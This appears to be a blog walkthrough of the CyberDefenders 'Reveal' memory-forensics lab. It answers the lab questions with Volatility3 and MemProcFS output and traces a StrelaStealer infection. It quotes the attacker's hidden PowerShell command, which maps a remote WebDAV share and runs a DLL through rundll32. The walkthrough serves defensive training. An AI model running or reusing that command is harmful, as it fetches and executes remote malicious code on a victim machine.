---
title: Endpoint Forensics - Reveal @CyberDefender
date: 2025-08-4 00:00:00 +0700
categories: [dfir, blue-teaming, cyber-defender]
tags: [digital-forensics, endpoint-forensics, memory-analysis]
author: <author_id>
description: Reveal Lab @CyberDefender Walkthrough
# toc: false # Uncomment to disable the Table of Contents in the right panel
# comments: false # Uncomment to disable comments
image: /assets/images/preview/cyberdefenders_og.png
---


### Scenario

You are a forensic investigator at a financial institution, and your SIEM flagged unusual activity on a workstation with access to sensitive financial data. Suspecting a breach, you received a memory dump from the compromised machine. Your task is to analyze the memory for signs of compromise, trace the anomaly's origin, and assess its scope to contain the incident effectively.

### Collected Data
- 192-Reveal.dmp ~ 2GB in size

### Tools
- [Volatility3](https://github.com/volatilityfoundation/volatility3)
- [MemProcFS](https://github.com/ufrisk/MemProcFS)

### Questions

#### Q1: Identifying the name of the malicious process helps in understanding the nature of the attack. What is the name of the malicious process?

Before answer these questions, let's use MemProcFS with Forensic Mode 1, to mount memory dump file.

```shell
/path/to/MemProcFS MemProcFS.exe -f /path/to/memorydump 192-Reveal.dmp -forensic 1
```

![pic1](assets/images/cyberdefender/reveallab/pic1.png)

Everyone has their bias analysis style, for me, in an incident case where i don't know where to look into first, i alway start at **Network Activity**, for Volatility3 you can use `windows.netstat`, since i could get that information from MemProcFS at `M:\sys\net\netstat.txt`, i'll utilize it.

```shell
   #    PID Proto  State        Src                           Dst                          Process
--------------------------------------------------------------------------------------------------
0000      0 TCPv0  CLOSED       ***:0                         ***
0001      0 TCPv0  CLOSED       ***:0                         ***
0002      0 TCPv0  CLOSED       ***:0                         ***
0003      4 TCPv6  LISTENING    [::]:445                      ***                          System
0004      4 TCPv4  LISTENING    192.168.19.150:139            ***                          System
0005    440 TCPv0  CLOSED       ***:0                         ***                          svchost.exe
0006    440 TCPv0  CLOSED       ***:0                         ***                          svchost.exe
0007    440 TCPv0  CLOSED       ***:0                         ***                          svchost.exe
0008    440 TCPv0  CLOSED       ***:0                         ***                          svchost.exe
0009    440 TCPv0  CLOSED       ***:0                         ***                          svchost.exe
000a    440 TCPv4  LISTENING    0.0.0.0:49667                 ***                          svchost.exe
000b    440 TCPv6  LISTENING    [::]:49667                    ***                          svchost.exe
000c    440 TCPv4  ESTABLISHED  192.168.19.150:51003          13.74.129.92:443             svchost.exe
000d    440 TCPv4  ESTABLISHED  192.168.19.150:51004          23.44.141.39:443             svchost.exe
000e    492 TCPv4  LISTENING    0.0.0.0:49665                 ***                          wininit.exe
000f    492 TCPv6  LISTENING    [::]:49665                    ***                          wininit.exe
0010    628 TCPv4  LISTENING    0.0.0.0:49670                 ***                          services.exe
0011    628 TCPv6  LISTENING    [::]:49670                    ***                          services.exe
0012    636 TCPv4  LISTENING    0.0.0.0:49664                 ***                          lsass.exe
0013    636 TCPv6  LISTENING    [::]:49664                    ***                          lsass.exe
0014    656 TCPv4  LISTENING    0.0.0.0:49666                 ***                          svchost.exe
0015    656 TCPv6  LISTENING    [::]:49666                    ***                          svchost.exe
0016    872 TCPv4  LISTENING    0.0.0.0:135                   ***                          svchost.exe
0017    872 TCPv6  LISTENING    [::]:135                      ***                          svchost.exe
0018   1112 TCPv4  LISTENING    0.0.0.0:5040                  ***                          svchost.exe
0019   1260 TCPv0  CLOSED       ***:0                         ***                          svchost.exe
001a   1260 TCPv4  ESTABLISHED  192.168.19.150:51034          196.204.4.8:80               svchost.exe
001b   1260 TCPv4  ESTABLISHED  192.168.19.150:51035          196.204.4.8:80               svchost.exe
001c   1864 TCPv4  LISTENING    0.0.0.0:49668                 ***                          spoolsv.exe
001d   1864 TCPv6  LISTENING    [::]:49668                    ***                          spoolsv.exe
001e   2416 TCPv4  ESTABLISHED  192.168.19.150:51038          45.9.74.32:8888              net.exe
001f   2820 TCPv4  ESTABLISHED  192.168.19.150:51037          191.237.206.80:443           smartscreen.exe
0020   4696 TCPv0  CLOSED       ***:0                         ***                          SearchApp.exe
0021   5364 TCPv4  ESTABLISHED  127.0.0.1:50184               127.0.0.1:50185              thunderbird.exe
0022   5364 TCPv4  ESTABLISHED  127.0.0.1:50185               127.0.0.1:50184              thunderbird.exe
0023   5780 TCPv0  CLOSED       ***:0                         ***                          msedge.exe
0024   5780 TCPv0  CLOSED       ***:0                         ***                          msedge.exe
0025   5780 TCPv0  CLOSED       ***:0                         ***                          msedge.exe
0026   5780 TCPv4  CLOSED       192.168.19.150:51031          20.93.72.182:443             msedge.exe
0027   5780 TCPv4  CLOSED       192.168.19.150:51033          20.191.45.158:443            msedge.exe
0028   6016 TCPv0  CLOSED       ***:0                         ***                          svchost.exe
0029   6016 TCPv0  CLOSED       ***:0                         ***                          svchost.exe
002a   6016 TCPv6  LISTENING    [::]:7680                     ***                          svchost.exe
002b   6780 TCPv4  ESTABLISHED  192.168.19.150:49948          13.107.6.156:443             WWAHost.exe
002c   6780 TCPv4  ESTABLISHED  192.168.19.150:49955          93.186.134.98:443            WWAHost.exe
002d   7160 TCPv4  CLOSED       192.168.19.150:50510          204.79.197.203:443           SearchApp.exe
002e   7176 TCPv4  CLOSED       192.168.19.150:50538          13.107.42.16:443             SkypeApp.exe
002f   7176 TCPv4  CLOSE_WAIT   192.168.19.150:50539          192.229.221.95:80            SkypeApp.exe
0030   7176 TCPv4  CLOSED       192.168.19.150:50559          20.42.73.26:443              SkypeApp.exe
0031      4 UDPv4  ***          192.168.19.150:137            ***                          System
0032      4 UDPv4  ***          192.168.19.150:137            ***                          System
0033      4 UDPv4  ***          192.168.19.150:138            ***                          System
0034      4 UDPv4  ***          192.168.19.150:138            ***                          System
0035    440 UDPv4  ***          127.0.0.1:64467               ***                          svchost.exe
0036   1112 UDPv4  ***          0.0.0.0:5050                  ***                          svchost.exe
0037   1260 UDPv6  ***          [::]:0                        ***                          svchost.exe
0038   1260 UDPv6  ***          [::]:0                        ***                          svchost.exe
0039   1260 UDPv4  ***          0.0.0.0:5353                  ***                          svchost.exe
003a   1260 UDPv6  ***          [::]:5353                     ***                          svchost.exe
003b   1260 UDPv4  ***          0.0.0.0:5355                  ***                          svchost.exe
003c   1260 UDPv4  ***          0.0.0.0:5355                  ***                          svchost.exe
003d   1260 UDPv6  ***          [::]:5355                     ***                          svchost.exe
003e   1260 UDPv6  ***          [::]:5355                     ***                          svchost.exe
003f   5488 UDPv4  ***          0.0.0.0:5353                  ***                          msedge.exe
0040   5488 UDPv4  ***          0.0.0.0:5353                  ***                          msedge.exe
0041   5488 UDPv6  ***          [::]:5353                     ***                          msedge.exe
0042   5488 UDPv6  ***          [::]:5353                     ***                          msedge.exe
0043   5760 UDPv6  ***          [::1]:1900                    ***                          svchost.exe
0044   5760 UDPv6  ***          [::1]:56825                   ***                          svchost.exe
0045   5760 UDPv4  ***          127.0.0.1:1900                ***                          svchost.exe
0046   5760 UDPv4  ***          127.0.0.1:56827               ***                          svchost.exe
0047   5760 UDPv4  ***          192.168.19.150:1900           ***                          svchost.exe
0048   5760 UDPv4  ***          192.168.19.150:56826          ***                          svchost.exe
0049   5760 UDPv6  ***          [fe80::48b8:bbd7:ee10:6873]:1900  ***                          svchost.exe
004a   5760 UDPv6  ***          [fe80::48b8:bbd7:ee10:6873]:56824  ***                          svchost.exe
004b   5780 UDPv4  ***          0.0.0.0:63862                 ***                          msedge.exe
004c   7176 UDPv6  ***          [::]:61311                    ***                          SkypeApp.exe
```

There's one process catches my eyes - `net.exe`, first is port, second is process itself.

```shell
001e   2416 TCPv4  ESTABLISHED  192.168.19.150:51038          45.9.74.32:8888              net.exe
```

Grab the PPID and check Process Tree in Vol3, i found out powershell has been utilized by adversary for second stage payload `3435.dll`.
```shell
windows.pstree --pid 2416

PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        Audit   Cmd     Path

3692    4120    powershell.exe  0xc90c0358b080  17      -       1       False   2024-07-15 07:00:03.000000 UTC  N/A     \Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  powershell.exe  -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry     C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
* 2416  3692    net.exe 0xc90c08fd6080  5       -       1       False   2024-07-15 07:00:06.000000 UTC  N/A     \Device\HarddiskVolume3\Windows\System32\net.exe        "C:\Windows\system32\net.exe" use \\45.9.74.32@8888\davwwwroot\ C:\Windows\system32\net.exe
```

This question should not be "What's malicious process" since `powershell.exe` itself is not a malicious process, but nvm.

> ANSWER: `powershell.exe`
{: .prompt-info }

#### Q2: Knowing the parent process ID (PPID) of the malicious process aids in tracing the process hierarchy and understanding the attack flow. What is the parent PID of the malicious process?

The Parent Process ID of `powershell.exe` could be found in Vol3, which is 4120

![pic2](assets/images/cyberdefender/reveallab/pic2.png)

> ANSWER: `4120`
{: .prompt-info }

#### Q3: Determining the file name used by the malware for executing the second-stage payload is crucial for identifying subsequent malicious activities. What is the file name that the malware uses to execute the second-stage payload?

Let's take a look into the powershell command:

```shell
powershell.exe  -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
```

First, adversary utilize `net.exe` to map public shared drive named `davwwwroot` to victim machine, and then use `rundll32.exe` to run second payload called `3435.dll` with entry point `entry`. Suspicious `3435.dll` seems like the main payload of this kill-chain, hence, i would like to somehow interpret it for deeper analysis.

> ANSWER: `3435.dll`
{: .prompt-info }

#### Q4: Identifying the shared directory on the remote server helps trace the resources targeted by the attacker. What is the name of the shared directory being accessed on the remote server?

Since i disscused entire Powershell command in previous question, this one won't be hard to find the correct answer.

> ANSWER: `davwwwroot`
{: .prompt-info }

#### Q5: What is the MITRE ATT&CK sub-technique ID that describes the execution of a second-stage payload using a Windows utility to run the malicious file?

Since adversary utilized `rundll32.exe` - a signed binary execution - often to bypass security tools, we could categoried this behavior under:
- Tactic: Defense Evastion
  - Technique: System Binary Proxy Execution: Rundll32
  - ID: T1218.011

![pic3](assets/images/cyberdefender/reveallab/pic3.png)

Link to MITRE ATT&CK: [https://attack.mitre.org/techniques/T1218/011/](https://attack.mitre.org/techniques/T1218/011/)

> ANSWER: `T1218.011`
{: .prompt-info }

#### Q6: Identifying the username under which the malicious process runs helps in assessing the compromised account and its potential impact. What is the username that the malicious process runs under?

For this type of question, i would like to identify the user was executed suspected processes, there are several ways to do it, for me, since i got MemProcFS, i could identify "user - proccess" by navigate to `M:\sys\proc\proc.txt`

```shell
  Process                      Pid Parent   Flag User             Create Time              Exit Time
------------------------------------------------------------------------------------------------------------------
- System                         4      0        SYSTEM           2024-07-04 10:44:48 UTC                      ***
-- Registry                     92      4        SYSTEM           2024-07-04 10:44:43 UTC                      ***
-- smss.exe                    300      4        SYSTEM           2024-07-04 10:44:48 UTC                      ***
-- MemCompression             1452      4        SYSTEM           2024-07-04 10:44:51 UTC                      ***
- csrss.exe                    416    404        SYSTEM           2024-07-04 10:44:50 UTC                      ***
- wininit.exe                  492    404        SYSTEM           2024-07-04 10:44:50 UTC                      ***
-- services.exe                628    492        SYSTEM           2024-07-04 10:44:50 UTC                      ***
--- svchost.exe                420    628        LOCAL SERVICE    2024-07-04 10:44:51 UTC                      ***
--- svchost.exe                440    628        SYSTEM           2024-07-04 10:44:51 UTC                      ***
---- AppHostRegistr           1252    440    T *                  2024-07-04 10:47:11 UTC  2024-07-04 10:47:11 UTC
---- taskhostw.exe            1608    440     U  Elon             2024-07-15 04:13:50 UTC                      ***
---- consent.exe              2516    440    T *                  2024-07-15 06:59:57 UTC  2024-07-15 07:00:00 UTC
---- sihost.exe               3216    440     U  Elon             2024-07-04 10:44:59 UTC                      ***
---- taskhostw.exe            3316    440     U  Elon             2024-07-04 10:44:59 UTC                      ***
---- AppHostRegistr           3620    440    T *                  2024-07-04 10:47:11 UTC  2024-07-04 10:47:11 UTC
---- wsqmcons.exe             3804    440    T *                  2024-07-15 07:00:00 UTC  2024-07-15 07:00:00 UTC
---- MicrosoftEdgeU           6244    440    T *                  2024-07-15 06:58:14 UTC  2024-07-15 06:58:16 UTC
---- taskhostw.exe            8300    440    T *                  2024-07-15 04:19:11 UTC  2024-07-15 04:19:12 UTC
---- OneDriveStanda           8528    440    T *                  2024-07-15 06:58:16 UTC  2024-07-15 06:59:26 UTC
---- MicrosoftEdgeU           8788    440    T *                  2024-07-15 06:58:14 UTC  2024-07-15 06:58:14 UTC
---- consent.exe              9228    440    T *                  2024-07-15 04:17:35 UTC  2024-07-15 04:17:37 UTC
---- taskhostw.exe           10156    440    T *                  2024-07-15 06:58:14 UTC  2024-07-15 06:58:16 UTC
--- svchost.exe                656    628        LOCAL SERVICE    2024-07-04 10:44:51 UTC                      ***
--- svchost.exe                764    628        SYSTEM           2024-07-04 10:44:50 UTC                      ***
---- RuntimeBroker.           1400    764     U  Elon             2024-07-15 04:09:52 UTC                      ***
---- backgroundTask           2184    764    T *                  2024-07-15 06:58:57 UTC  2024-07-15 06:58:58 UTC
---- dllhost.exe              2764    764    T *                  2024-07-15 04:23:08 UTC  2024-07-15 04:23:14 UTC
---- smartscreen.ex           2820    764     U  Elon             2024-07-15 06:59:57 UTC                      ***
---- WmiPrvSE.exe             2828    764        NETWORK SERVICE  2024-07-04 10:44:53 UTC                      ***
---- MoUsoCoreWorke           2936    764    T *                  2024-07-15 04:02:34 UTC  2024-07-15 04:22:49 UTC
---- dllhost.exe              2948    764    T *                  2024-07-15 04:20:59 UTC  2024-07-15 04:21:05 UTC
---- dllhost.exe              3608    764    T *                  2024-07-04 10:48:01 UTC  2024-07-04 10:48:12 UTC
---- TiWorker.exe             3892    764    T *                  2024-07-15 04:21:42 UTC  2024-07-15 06:58:38 UTC
---- ShellExperienc           4296    764     U  Elon             2024-07-15 04:02:32 UTC                      ***
---- StartMenuExper           4356    764     U  Elon             2024-07-04 10:45:02 UTC                      ***
---- dllhost.exe              4476    764    T *                  2024-07-15 04:23:02 UTC  2024-07-15 04:23:07 UTC
---- RuntimeBroker.           4500    764     U  Elon             2024-07-04 10:45:02 UTC                      ***
---- SearchApp.exe            4696    764     U  Elon             2024-07-04 10:45:03 UTC                      ***
---- RuntimeBroker.           4780    764     U  Elon             2024-07-15 04:02:32 UTC                      ***
---- RuntimeBroker.           4796    764     U  Elon             2024-07-04 10:45:03 UTC                      ***
---- RuntimeBroker.           5180    764     U  Elon             2024-07-04 10:45:09 UTC                      ***
---- dllhost.exe              6212    764     U  Elon             2024-07-04 10:46:52 UTC                      ***
---- RuntimeBroker.           6560    764    T *                  2024-07-15 06:58:21 UTC  2024-07-15 06:59:40 UTC
---- Calculator.exe           6568    764     U* Elon             2024-07-15 04:09:51 UTC                      ***
---- TextInputHost.           6604    764     U  Elon             2024-07-04 10:45:16 UTC                      ***
---- ApplicationFra           6700    764     U  Elon             2024-07-04 10:46:50 UTC                      ***
---- WWAHost.exe              6780    764     U  Elon             2024-07-04 10:46:50 UTC                      ***
---- dllhost.exe              7016    764    T *                  2024-07-15 06:58:16 UTC  2024-07-15 06:58:21 UTC
---- SearchApp.exe            7160    764     U  Elon             2024-07-15 04:06:33 UTC                      ***
---- SkypeApp.exe             7176    764     U* Elon             2024-07-04 10:45:57 UTC                      ***
---- RuntimeBroker.           7336    764     U  Elon             2024-07-04 10:46:48 UTC                      ***
---- RuntimeBroker.           7488    764    T *                  2024-07-15 06:58:21 UTC  2024-07-15 06:59:05 UTC
---- backgroundTask           7628    764    T *                  2024-07-15 06:58:15 UTC  2024-07-15 06:58:25 UTC
---- dllhost.exe              7632    764    T *                  2024-07-15 04:19:04 UTC  2024-07-15 04:19:09 UTC
---- RuntimeBroker.           7848    764     U  Elon             2024-07-04 10:46:21 UTC                      ***
---- SkypeBackgroun           8280    764     U* Elon             2024-07-15 04:06:48 UTC                      ***
---- MoUsoCoreWorke           8368    764    T *                  2024-07-15 06:58:22 UTC  2024-07-15 06:59:33 UTC
---- backgroundTask           8504    764    T *                  2024-07-15 06:58:21 UTC  2024-07-15 06:58:21 UTC
---- dllhost.exe              8544    764        SYSTEM           2024-07-15 04:06:51 UTC                      ***
---- backgroundTask           8792    764    T *                  2024-07-15 06:58:15 UTC  2024-07-15 06:59:22 UTC
---- backgroundTask           9256    764    T *                  2024-07-15 06:58:15 UTC  2024-07-15 06:59:22 UTC
---- dllhost.exe              9772    764    T *                  2024-07-15 04:17:51 UTC  2024-07-15 04:17:59 UTC
--- svchost.exe                832    628     U  Elon             2024-07-15 07:00:06 UTC                      ***
--- svchost.exe                872    628        NETWORK SERVICE  2024-07-04 10:44:50 UTC                      ***
--- svchost.exe               1040    628        SYSTEM           2024-07-04 10:44:51 UTC                      ***
---- CompatTelRunne           3280   1040    T *                  2024-07-15 04:17:58 UTC  2024-07-15 04:18:11 UTC
----- conhost.exe            10112   3280    T *                  2024-07-15 04:17:58 UTC  2024-07-15 04:18:11 UTC
---- ctfmon.exe               3504   1040     U  Elon             2024-07-04 10:44:59 UTC                      ***
--- svchost.exe               1112    628        LOCAL SERVICE    2024-07-04 10:44:51 UTC                      ***
--- svchost.exe               1260    628        NETWORK SERVICE  2024-07-04 10:44:51 UTC                      ***
--- svchost.exe               1520    628        LOCAL SERVICE    2024-07-04 10:44:51 UTC                      ***
---- audiodg.exe              7428   1520        LOCAL SERVICE    2024-07-15 06:58:15 UTC                      ***
--- svchost.exe               1680    628        SYSTEM           2024-07-04 10:44:51 UTC                      ***
--- svchost.exe               1688    628        LOCAL SERVICE    2024-07-04 10:44:51 UTC                      ***
--- svchost.exe               1696    628        LOCAL SERVICE    2024-07-04 10:44:51 UTC                      ***
--- spoolsv.exe               1864    628        SYSTEM           2024-07-04 10:44:51 UTC                      ***
--- svchost.exe               1944    628        LOCAL SERVICE    2024-07-04 10:44:52 UTC                      ***
--- svchost.exe               1952    628        LOCAL SERVICE    2024-07-04 10:44:52 UTC                      ***
--- svchost.exe               2080    628        SYSTEM           2024-07-04 10:44:52 UTC                      ***
--- wlms.exe                  2216    628        SYSTEM           2024-07-04 10:44:52 UTC                      ***
--- vm3dservice.ex            2232    628        SYSTEM           2024-07-04 10:44:52 UTC                      ***
---- vm3dservice.ex           2388   2232        SYSTEM           2024-07-04 10:44:52 UTC                      ***
--- vmtoolsd.exe              2248    628      * SYSTEM           2024-07-04 10:44:52 UTC                      ***
---- cmd.exe                  2952   2248    T *                  2024-07-15 06:58:14 UTC  2024-07-15 06:58:21 UTC
----- conhost.exe              180   2952    T *                  2024-07-15 06:58:14 UTC  2024-07-15 06:58:21 UTC
----- ipconfig.exe            2092   2952    T *                  2024-07-15 06:58:14 UTC  2024-07-15 06:58:21 UTC
--- VGAuthService.            2256    628      * SYSTEM           2024-07-04 10:44:52 UTC                      ***
--- MsMpEng.exe               2272    628        SYSTEM           2024-07-04 10:44:52 UTC                      ***
--- dllhost.exe               2736    628        SYSTEM           2024-07-04 10:44:53 UTC                      ***
--- msdtc.exe                 2856    628        NETWORK SERVICE  2024-07-04 10:44:53 UTC                      ***
--- svchost.exe               2956    628        SYSTEM           2024-07-04 10:44:53 UTC                      ***
--- svchost.exe               3148    628     U  Elon             2024-07-04 10:45:01 UTC                      ***
--- svchost.exe               3252    628     U  Elon             2024-07-04 10:44:59 UTC                      ***
--- svchost.exe               5760    628        LOCAL SERVICE    2024-07-04 10:45:13 UTC                      ***
--- TrustedInstall            5868    628    T *                  2024-07-15 04:21:42 UTC  2024-07-15 06:58:38 UTC
--- svchost.exe               6016    628        NETWORK SERVICE  2024-07-04 10:46:52 UTC                      ***
--- SecurityHealth            6268    628        SYSTEM           2024-07-04 10:45:15 UTC                      ***
--- svchost.exe               6644    628    T *                  2024-07-15 06:58:15 UTC  2024-07-15 06:59:15 UTC
--- svchost.exe               6760    628        LOCAL SERVICE    2024-07-04 10:46:54 UTC                      ***
--- sppsvc.exe                6812    628    T *                  2024-07-15 06:58:30 UTC  2024-07-15 06:59:01 UTC
--- OfficeClickToR            7460    628      * SYSTEM           2024-07-15 04:06:45 UTC                      ***
---- AppVShNotify.e          10108   7460     U* Elon             2024-07-15 04:14:55 UTC                      ***
--- SgrmBroker.exe            7692    628        SYSTEM           2024-07-04 10:46:53 UTC                      ***
--- svchost.exe               7792    628        LOCAL SERVICE    2024-07-04 10:46:35 UTC                      ***
--- svchost.exe               8392    628    T *                  2024-07-15 06:58:25 UTC  2024-07-15 06:59:25 UTC
--- SearchIndexer.            9296    628        SYSTEM           2024-07-15 04:16:20 UTC                      ***
---- SearchProtocol           4164   9296     U  Elon             2024-07-15 04:17:20 UTC                      ***
---- SearchProtocol           6388   9296        SYSTEM           2024-07-15 06:58:52 UTC                      ***
---- SearchFilterHo           8732   9296    T *                  2024-07-15 04:22:07 UTC  2024-07-15 06:59:00 UTC
---- SearchFilterHo           8864   9296        SYSTEM           2024-07-15 06:59:00 UTC                      ***
---- SearchFilterHo           9224   9296    T *                  2024-07-15 04:19:06 UTC  2024-07-15 04:22:07 UTC
---- SearchProtocol           9500   9296    T *                  2024-07-15 04:16:20 UTC  2024-07-15 04:22:20 UTC
--- svchost.exe               9340    628        SYSTEM           2024-07-15 04:14:05 UTC                      ***
--- svchost.exe               9992    628    T *                  2024-07-15 04:21:48 UTC  2024-07-15 04:22:48 UTC
-- lsass.exe                   636    492        SYSTEM           2024-07-04 10:44:50 UTC                      ***
-- fontdrvhost.ex              748    492        UMFD-0           2024-07-04 10:44:50 UTC                      ***
- csrss.exe                    512    484        SYSTEM           2024-07-04 10:44:50 UTC                      ***
- winlogon.exe                 588    484        SYSTEM           2024-07-04 10:44:50 UTC                      ***
-- fontdrvhost.ex              752    588        UMFD-1           2024-07-04 10:44:50 UTC                      ***
-- dwm.exe                     956    588        DWM-1            2024-07-04 10:44:50 UTC                      ***
-- userinit.exe               3616    588    TU  Elon             2024-07-04 10:44:59 UTC  2024-07-04 10:45:23 UTC
--- explorer.exe              3656   3616     U  Elon             2024-07-04 10:44:59 UTC                      ***
---- 7zG.exe                  3428   3656    T *                  2024-07-15 06:59:05 UTC  2024-07-15 06:59:08 UTC
---- 010EditorWin64           3872   3656    T *                  2024-07-15 04:17:35 UTC  2024-07-15 04:17:52 UTC
----- 010EditorWin64          3352   3872    T *                  2024-07-15 04:17:35 UTC  2024-07-15 04:17:52 UTC
------ 010Editor.exe          2592   3352    T *                  2024-07-15 04:17:51 UTC  2024-07-15 04:17:56 UTC
------ 010EditorWin64         2780   3352    T *                  2024-07-15 04:17:37 UTC  2024-07-15 04:17:52 UTC
------- 010EditorWin64        9096   2780    T *                  2024-07-15 04:17:37 UTC  2024-07-15 04:17:52 UTC
-------- unins00a.exe         6772   9096    T *                  2024-07-15 04:17:51 UTC  2024-07-15 04:17:51 UTC
-------- regsvr32.exe         8232   9096    T *                  2024-07-15 04:17:50 UTC  2024-07-15 04:17:51 UTC
---- cmd.exe                  4120   3656    T *                  2024-07-15 07:00:00 UTC  2024-07-15 07:00:03 UTC
----- powershell.exe          3692   4120     U  Elon             2024-07-15 07:00:03 UTC                      ***
------ net.exe                2416   3692     U  Elon             2024-07-15 07:00:06 UTC                      ***
------ conhost.exe            6892   3692     U  Elon             2024-07-15 07:00:03 UTC                      ***
----- conhost.exe             8736   4120    T *                  2024-07-15 07:00:03 UTC  2024-07-15 07:00:03 UTC
----- wordpad.exe             9112   4120     U* Elon             2024-07-15 07:00:03 UTC                      ***
---- thunderbird.ex           5364   3656     U* Elon             2024-07-15 04:03:59 UTC                      ***
----- thunderbird.ex          3004   5364     U* Elon             2024-07-15 04:09:02 UTC                      ***
----- thunderbird.ex          3644   5364     U* Elon             2024-07-15 04:09:02 UTC                      ***
----- thunderbird.ex          4492   5364     U* Elon             2024-07-15 04:04:00 UTC                      ***
----- thunderbird.ex          8332   5364     U* Elon             2024-07-15 04:04:12 UTC                      ***
----- thunderbird.ex          8600   5364     U* Elon             2024-07-15 04:04:03 UTC                      ***
---- msedge.exe               5488   3656     U* Elon             2024-07-04 10:45:13 UTC                      ***
----- msedge.exe               672   5488    T *                  2024-07-15 06:58:48 UTC  2024-07-15 06:58:53 UTC
----- msedge.exe              1008   5488    T *                  2024-07-15 04:20:34 UTC  2024-07-15 04:21:09 UTC
----- msedge.exe              1200   5488     U* Elon             2024-07-15 04:02:53 UTC                      ***
----- dllhost.exe             1480   5488    T *                  2024-07-15 04:22:55 UTC  2024-07-15 04:23:00 UTC
----- msedge.exe              1880   5488     U* Elon             2024-07-15 04:19:01 UTC                      ***
----- msedge.exe              1920   5488     U* Elon             2024-07-15 06:58:45 UTC                      ***
----- msedge.exe              2556   5488    T *                  2024-07-15 04:19:03 UTC  2024-07-15 04:19:09 UTC
----- msedge.exe              3268   5488    T *                  2024-07-15 04:18:58 UTC  2024-07-15 04:20:39 UTC
----- msedge.exe              3360   5488    T *                  2024-07-15 06:58:52 UTC  2024-07-15 06:58:53 UTC
----- msedge.exe              3784   5488    T *                  2024-07-15 06:58:41 UTC  2024-07-15 06:58:48 UTC
----- msedge.exe              3904   5488    T *                  2024-07-04 10:46:56 UTC  2024-07-04 10:46:57 UTC
----- msedge.exe              4464   5488     U* Elon             2024-07-15 04:17:28 UTC                      ***
----- ngen.exe                4508   5488    T *                  2024-07-15 04:16:10 UTC  2024-07-15 04:16:10 UTC
----- msedge.exe              5004   5488    T *                  2024-07-15 04:18:58 UTC  2024-07-15 04:20:39 UTC
----- msedge.exe              5088   5488     U* Elon             2024-07-04 10:46:14 UTC                      ***
----- msedge.exe              5148   5488    T *                  2024-07-15 04:18:00 UTC  2024-07-15 04:18:31 UTC
----- msedge.exe              5540   5488     U* Elon             2024-07-04 10:45:13 UTC                      ***
----- msedge.exe              5768   5488     U* Elon             2024-07-04 10:45:14 UTC                      ***
----- msedge.exe              5780   5488     U* Elon             2024-07-04 10:45:14 UTC                      ***
----- msedge.exe              5792   5488     U* Elon             2024-07-04 10:45:14 UTC                      ***
----- msedge.exe              6404   5488     U* Elon             2024-07-15 06:58:52 UTC                      ***
----- identity_helpe          7080   5488    T *                  2024-07-15 04:17:26 UTC  2024-07-15 04:17:26 UTC
----- msedge.exe              7224   5488    T *                  2024-07-15 04:18:56 UTC  2024-07-15 04:20:39 UTC
----- msedge.exe              7500   5488    T *                  2024-07-15 04:18:51 UTC  2024-07-15 04:19:26 UTC
----- msedge.exe              7540   5488     U* Elon             2024-07-04 10:45:35 UTC                      ***
----- msedge.exe              7720   5488    T *                  2024-07-15 04:17:27 UTC  2024-07-15 04:17:32 UTC
----- msedge.exe              9056   5488    T *                  2024-07-15 06:58:44 UTC  2024-07-15 06:59:18 UTC
----- msedge.exe              9060   5488    T *                  2024-07-15 04:18:58 UTC  2024-07-15 04:19:07 UTC
----- msedge.exe              9548   5488    T *                  2024-07-15 06:58:53 UTC  2024-07-15 06:58:53 UTC
----- conhost.exe             9748   5488    T *                  2024-07-15 04:16:10 UTC  2024-07-15 04:16:10 UTC
----- msedge.exe             10136   5488     U* Elon             2024-07-15 04:18:53 UTC                      ***
---- SecurityHealth           5848   3656     U  Elon             2024-07-04 10:45:15 UTC                      ***
---- vmtoolsd.exe             6368   3656     U* Elon             2024-07-04 10:45:15 UTC                      ***
---- 010Editor.exe            8220   3656    T *                  2024-07-15 04:18:05 UTC  2024-07-15 04:18:46 UTC
---- notepad.exe              8720   3656     U  Elon             2024-07-15 04:08:10 UTC                      ***
- ngen.exe                    7100   2592    T *                  2024-07-15 04:16:08 UTC  2024-07-15 04:16:08 UTC
-- conhost.exe                4412   7100    T *                  2024-07-15 04:16:08 UTC  2024-07-15 04:16:08 UTC
- ngen.exe                    9320   2592    T *                  2024-07-15 04:16:08 UTC  2024-07-15 04:16:08 UTC
-- conhost.exe                1516   9320    T *                  2024-07-15 04:16:08 UTC  2024-07-15 04:16:08 UTC
- ngen.exe                    9672   2592    T *                  2024-07-15 04:16:10 UTC  2024-07-15 04:16:10 UTC
- setup.exe                   7796   4452    T *                  2024-07-04 10:47:56 UTC  2024-07-04 10:48:12 UTC
- InspectorOffic              7420   5228    T *                  2024-07-15 04:03:36 UTC  2024-07-15 04:13:58 UTC
- msedge.exe                  1896   5384    T *                  2024-07-04 10:47:14 UTC  2024-07-04 10:47:03 UTC
- MicrosoftEdgeU              1728   6192 32   * SYSTEM           2024-07-15 04:03:38 UTC                      ***
- dllhost.exe                 7968   7016    T *                  2024-07-15 04:03:35 UTC  2024-07-15 04:07:12 UTC
- msedge.exe                  9660   7468    T *                  2024-07-15 04:16:31 UTC  2024-07-15 04:17:27 UTC
- schtasks.exe                6480   8320    T *                  2024-07-15 04:15:01 UTC  2024-07-15 04:15:02 UTC
- conhost.exe                 6872   9672    T *                  2024-07-15 04:16:08 UTC  2024-07-15 04:16:08 UTC
```

Now you can see entire process tree, `cmd.exe` -> `powershell.exe` -> `net.exe` under user "Elon"
```shell
---- cmd.exe                  4120   3656    T *                  2024-07-15 07:00:00 UTC  2024-07-15 07:00:03 UTC
----- powershell.exe          3692   4120     U  Elon             2024-07-15 07:00:03 UTC                      ***
------ net.exe                2416   3692     U  Elon             2024-07-15 07:00:06 UTC                      ***
```

> ANSWER: `Elon`
{: .prompt-info }

#### Q7: Knowing the name of the malware family is essential for correlating the attack with known threats and developing appropriate defenses. What is the name of the malware family?

Since we got the adversary infrastructure which is their IP Address - `45.9.74.32`, a bit of OSINT would nail the job for us.

- [Virus Total](https://www.virustotal.com/gui/ip-address/45.9.74.32)
- [ThreatFox](https://threatfox.abuse.ch/browse.php?search=ioc%3A45.9.74.32)
- [Hybrid Analysis](https://hybrid-analysis.com/search?query=45.9.74.32)

> ANSWER: `STRELASTEALER`
{: .prompt-info }

